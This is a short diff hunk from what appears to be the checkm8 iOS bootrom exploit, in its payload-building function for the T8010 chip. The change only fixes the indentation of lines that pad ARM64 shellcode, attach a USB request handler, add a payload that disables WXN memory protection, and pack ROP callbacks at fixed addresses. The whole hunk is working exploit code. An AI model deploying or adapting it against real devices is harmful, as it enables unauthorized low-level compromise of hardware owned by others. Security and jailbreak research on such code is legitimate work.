@@ -352,11 +352,11 @@ def payload(cpid):
     ]
     t8010_handler = asm_arm64_x7_trampoline(t8010_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8010)[4:]
     t8010_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8010)
-assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64
-assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64
-t8010_shellcode = t8010_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
-assert len(t8010_shellcode) <= 0x400
-return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
+    assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64
+    assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64
+    t8010_shellcode = t8010_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
+    assert len(t8010_shellcode) <= 0x400
+    return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
   if cpid == 0x8011:
     constants_usb_t8011 = [
                0x1800B0000, # 1 - LOAD_ADDRESS
